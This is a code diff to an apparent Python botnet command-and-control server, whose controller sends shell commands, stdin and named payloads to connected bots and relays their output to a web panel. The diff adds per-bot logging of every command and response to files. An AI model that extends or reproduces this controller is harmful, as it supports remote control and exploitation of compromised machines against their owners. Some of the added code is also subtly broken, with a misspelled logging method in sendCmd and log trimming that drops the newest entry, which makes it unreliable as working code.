@@ -3,6 +3,7 @@ from threading import Thread, Condition
 from threading import Lock
 import select
 import base64
+import os
 
 try:
     from server import formatsock, server
@@ -33,6 +34,7 @@ class BotNet(Thread):
         self.connlock = Lock()
         self.conncon = Condition(self.connlock)
         self.allConnections = {}
+        self.logs = {}
         self.socketio = socketio
         self.filemanager = BotNetFileManager(downloadpath)
         self.payloadmanager = BotNetPayloadManager(payloadpath)
@@ -43,6 +45,7 @@ class BotNet(Thread):
             if user in self.allConnections:
                 pass  # TODO: How to deal with duplicate usernames?
             self.allConnections[user] = conn
+            self.logs[user] = BotLog(user)
             self.conncon.notifyAll()
             # Notify recv thread
 
@@ -105,13 +108,21 @@ class BotNet(Thread):
                         fileclose = jsonobj[BotNet.FILECLOSE_JSON]
 
                     # Forward stdout/stderr... as needed
-                    self.socketio.emit('response',
-                                       {'user': user,
-                                        'printout': printout,
-                                        'errout': errout,
-                                        'stdout': out,
-                                        'stderr': err},
-                                       namespace="/bot")
+                    totallen = len(printout) + len(errout) + len(out) + len(err)
+                    if totallen > 0:
+                        log = self.logs[user]
+                        log.logstdout(printout)
+                        log.logstderr(errout)
+                        log.logstdout(out)
+                        log.logstderr(err)
+
+                        self.socketio.emit('response',
+                                           {'user': user,
+                                            'printout': printout,
+                                            'errout': errout,
+                                            'stdout': out,
+                                            'stderr': err},
+                                           namespace="/bot")
 
                     if len(special) > 0:
                         if BotNet.LS_JSON in special:
@@ -136,9 +147,18 @@ class BotNet(Thread):
                     # Connection was interrupted
                     self.removeConnection(user)
 
+    def getLog(self, user):
+        with self.connlock:
+            log = []
+            if user in self.logs:
+                for entry in self.logs[user].log:
+                        log.append(entry)
+            return log
+
     def sendStdin(self, user, cmd):
         with self.connlock:
             if user in self.allConnections:
+                self.logs[user].logstdin(cmd)
                 self.allConnections[user].send(cmd, type="stdin")
                 return True
             self.socketio.emit('response',
@@ -148,6 +168,7 @@ class BotNet(Thread):
     def sendCmd(self, user, cmd):
         with self.connlock:
             if user in self.allConnections:
+                self.logs[user].logsdin("(cmd \""+cmd+"\")")
                 self.allConnections[user].send(cmd, type="cmd")
                 return True
             self.socketio.emit('response',
@@ -189,6 +210,7 @@ class BotNet(Thread):
     def sendPayload(self, user, payload, args):
         payloadtext = self.payloadmanager.getPayloadText(payload, args)
         if payloadtext:
+            self.logs[user].logstdin("(payload \""+payload+"\")")
             return self.sendEval(user, payloadtext)
         else:
             return False
@@ -289,3 +311,42 @@ class Bot:
         with self.botlock:
             json_str = json.dumps({Bot.LS_JSON: filename})
             self.sock.send(json_str)
+
+
+class BotLog:
+    STDOUT = 0
+    STDERR = 1
+    STDIN = 2
+    def __init__(self, user, maxlen=100, logdir="logs"):
+        self.user = user
+        self.log = []
+        self.maxlen = maxlen
+        if not os.path.isdir(logdir):
+            os.mkdir(logdir)
+        self.logpath = os.path.join(logdir,user+".log")
+        self.logobj = open(self.logpath,"a")
+
+    def logstdin(self,win):
+        if len(win) > 0:
+            self.log.append((BotLog.STDIN, win))
+            self.logobj.write("[IN]: \t" + str(win)+("\n" if win[-1]!="\n" else ""))
+            self.logobj.flush()
+            if len(self.log) > self.maxlen:
+                self.log.pop()
+
+    def logstdout(self, wout):
+        if len(wout) > 0:
+            self.log.append((BotLog.STDOUT,wout))
+            self.logobj.write("[OUT]:\t"+str(wout)+("\n" if wout[-1]!="\n" else ""))
+            self.logobj.flush()
+            if len(self.log)>self.maxlen:
+                self.log.pop()
+
+    def logstderr(self, wout):
+        if len(wout)>0:
+            self.log.append((BotLog.STDERR, wout))
+            self.logobj.write("[ERR]:\t" + str(wout)+("\n" if wout[-1]!="\n" else ""))
+            self.logobj.flush()
+            if len(self.log) > self.maxlen:
+                self.log.pop()
+
